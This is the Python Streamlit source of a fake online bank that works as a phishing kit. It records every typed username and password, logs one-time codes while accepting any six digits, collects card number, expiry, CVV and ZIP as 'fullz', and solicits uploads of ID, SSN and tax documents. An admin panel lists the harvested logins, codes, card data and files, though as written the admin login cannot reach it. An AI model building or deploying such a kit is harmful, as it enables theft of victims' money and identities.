import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import random

# ==================== SESSION STATE & INITIAL DATA ====================
state = st.session_state

# Initialize balances
if "checking" not in state:
    state.checking = 12340.50
if "savings" not in state:
    state.savings = 14911.32

# Initialize data structures
state.captured      = state.get("captured", [])
state.otp_log       = state.get("otp_log", [])
state.files         = state.get("files", [])
state.auth          = state.get("auth", False)
state.otp_verified  = state.get("otp_verified", False)
state.is_admin      = state.get("is_admin", False)

# Generate 3 months of fake transaction history (once)
if "transactions" not in state or len(state.transactions) == 0:
    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Apple", "Uber", "Target", "Costco", "Home Depot"]
    categories = ["Groceries", "Dining", "Gas", "Shopping", "Entertainment", "Bills", "Transfer"]
    
    txs = []
    start_date = datetime.now() - timedelta(days=90)
    
    for i in range(78):
        date = start_date + timedelta(days=random.randint(0, 90))
        amount = round(random.uniform(8.99, 899.99), 2)
        merchant = random.choice(merchants)
        cat = random.choice(categories)
        account = random.choice(["Checking", "Savings"])
        
        txs.append({
            "date": date.strftime("%Y-%m-%d"),
            "desc": merchant if cat != "Transfer" else f"Transfer to {account}",
            "amount": -amount if cat != "Transfer" else (amount if account == "Savings" else -amount),
            "account": account,
            "category": cat
        })
    
    # Sort by date
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.transactions = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== 2025 DARK PATRIOTIC THEME ====================
st.markdown("""
<style>
    .stApp {background: linear-gradient(135deg, #0a0e17, #1a1f2e, #0f1629); color: #e0e0e0;}
    .header {background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
             padding: 2.8rem; text-align: center; border-bottom: 14px solid #fcca46;
             border-radius: 0 0 70px 70px; box-shadow: 0 25px 60px rgba(0,0,0,0.9);}
    .eagle {font-size: 180px; margin: -40px;}
    .glass {background: rgba(255,255,255,0.09); backdrop-filter: blur(18px);
            border-radius: 32px; border: 1px solid rgba(255,255,255,0.18);
            padding: 2.2rem; box-shadow: 0 18px 50px rgba(0,0,0,0.7);}
    h1, h2, h3 {color: #fcca46 !important; text-shadow: 0 0 20px #fcca46;}
    .stButton>button {background: linear-gradient(45deg, #BF0A30, #002868);
                      color: white; font-weight: bold; border-radius: 60px;
                      height: 4.2rem; font-size: 1.25rem;}
    .stButton>button:hover {background: #fcca46; color: #002868; transform: scale(1.08);}
    .stTextInput > div > div > input {background: rgba(255,255,255,0.12); color: white; border-radius: 20px;}
    .stMetric {background: rgba(255,255,255,0.07); padding: 1.5rem; border-radius: 20px;}
</style>
""", unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    st.markdown(f'''
    <div class="header">
        <div class="eagle">Eagle</div>
        <h1>PRIVATE GLORY BANK</h1>
        <p style="font-size:28px;color:#fcca46">Land of the Free • Home of the Brave</p>
    </div>
    ''', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 1.4, 1])
    with col2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("### Secure Login Required")
        user = st.text_input("User ID", placeholder="client001")
        pwd = st.text_input("Password", type="password", placeholder="SecureUSA2025!")
        if st.button("Login Securely", use_container_width=True, type="primary"):
            state.captured.append({"time": datetime.now().isoformat(), "user": user, "pass": pwd})
            if user == "client001" and pwd == "SecureUSA2025!":
                state.auth = True
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.is_admin = True
                st.rerun()
            else:
                st.error("Access Denied")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    st.markdown(f"<div class='header'><div class='eagle'>Eagle</div><h1>Security Verification</h1></div>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#fcca46'>Code sent to ••••1776</h3>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code", max_chars=6, placeholder="000000")
    if st.button("Verify Code", type="primary", use_container_width=True):
        state.otp_log.append({"time": datetime.now().isoformat(), "otp": code})
        if len(code) == 6 and code.isdigit():
            state.otp_verified = True
            st.success("Verified Successfully")
            st.rerun()

# ==================== DASHBOARD ====================
def dashboard():
    st.markdown(f'''
    <div class="header">
        <div class="eagle">Eagle</div>
        <h1>PRIVATE GLORY BANK</h1>
    </div>
    ''', unsafe_allow_html=True)
    
    st.markdown(f"### Good Afternoon • {datetime.now().strftime('%A, %B %d')}")
    
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Checking", f"${state.checking:,.2f}")
    c2.metric("Savings", f"${state.savings:,.2f}")
    c3.metric("Total Balance", f"${state.checking + state.savings:,.2f}")
    c4.metric("Transactions", len(state.transactions))

    col1, col2 = st.columns([2, 1])
    with col1:
        st.markdown("<div class='glass'><h3>Recent Transactions</h3>", unsafe_allow_html=True)
        recent = pd.DataFrame(state.transactions[:12])
        st.dataframe(recent[["date", "desc", "amount"]], use_container_width=True, hide_index=True)
        st.markdown("</div>", unsafe_allow_html=True)
    with col2:
        st.markdown("<div class='glass'><h3>Account Distribution</h3>", unsafe_allow_html=True)
        fig = px.pie(values=[state.checking, state.savings], names=["Checking", "Savings"],
                     color_discrete_sequence=["#fcca46", "#002868"], hole=0.5)
        st.plotly_chart(fig, use_container_width=True)
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== INTERNAL TRANSFER ====================
def transfer():
    st.markdown(f"<div class='header'><div class='eagle'>Eagle</div><h2>Transfer Funds</h2></div>", unsafe_allow_html=True)
    
    col1, col2 = st.columns(2)
    with col1:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("#### Internal Transfer")
        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
        to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
        amount = st.number_input("Amount", min_value=0.01, max_value=state.checking + state.savings, format="%.2f")
        
        if st.button("Transfer Now", type="primary", use_container_width=True):
            if "Checking" in from_acc:
                if amount > state.checking:
                    st.error("Insufficient funds in Checking")
                else:
                    state.checking -= amount
                    state.savings += amount
                    state.transactions.insert(0, {
                        "date": datetime.now().strftime("%Y-%m-%d"),
                        "desc": f"Transfer to {to_acc.split()[0]}",
                        "amount": amount,
                        "account": "Savings"
                    })
                    state.transactions.insert(0, {
                        "date": datetime.now().strftime("%Y-%m-%d"),
                        "desc": f"Transfer from Checking",
                        "amount": -amount,
                        "account": "Checking"
                    })
                    st.success(f"Transferred ${amount:,.2f} → {to_acc}")
            else:
                if amount > state.savings:
                    st.error("Insufficient funds in Savings")
                else:
                    state.savings -= amount
                    state.checking += amount
                    state.transactions.insert(0, {
                        "date": datetime.now().strftime("%Y-%m-%d"),
                        "desc": f"Transfer to Checking",
                        "amount": amount,
                        "account": "Checking"
                    })
                    state.transactions.insert(0, {
                        "date": datetime.now().strftime("%Y-%m-%d"),
                        "desc": f"Transfer from Savings",
                        "amount": -amount,
                        "account": "Savings"
                    })
                    st.success(f"Transferred ${amount:,.2f} → Checking")
        st.markdown("</div>", unsafe_allow_html=True)

    with col2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("#### Pay Bill with Card")
        card = st.text_input("Card Number")
        exp = st.text_input("MM/YY")
        cvv = st.text_input("CVV", type="password")
        zipc = st.text_input("ZIP")
        payee = st.text_input("Payee")
        amt = st.number_input("Amount", 0.01)
        if st.button("Pay Bill", type="primary"):
            state.captured.append({"fullz": {"card":card,"exp":exp,"cvv":cvv,"zip":zipc,"payee":payee,"amt":amt}})
            st.success("Payment processed")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES & UPLOAD ====================
def messages():
    st.markdown(f"<div class='header'><div class='eagle'>Eagle</div><h2>Secure Uploads</h2></div>", unsafe_allow_html=True)
    st.markdown("<div class='glass'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload ID, SSN, Tax Forms, etc.", type=["pdf","jpg","png","docx"])
    if uploaded:
        state.files.append({"name": uploaded.name, "time": datetime.now().isoformat()})
        st.success("Document received")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== ADMIN PANEL ====================
def admin():
    st.markdown(f"<div class='header'><div class='eagle'>Eagle</div><h1 style='color:#fcca46'>ADMIN PANEL</h1></div>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "All Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in x], expanded=True)
    with tabs[3]: st.write(state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(state.transactions))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f'''
    <div style="text-align:center;padding:25px;background:#002868;border-radius:25px">
        <div class="eagle">Eagle</div>
        <h2 style="color:#fcca46">PGB</h2>
    </div>
    ''', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Messages", "Logout"])

# ==================== MAIN ====================
if not state.auth:
    login()
elif state.is_admin:
    admin()
elif not state.otp_verified:
    otp()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
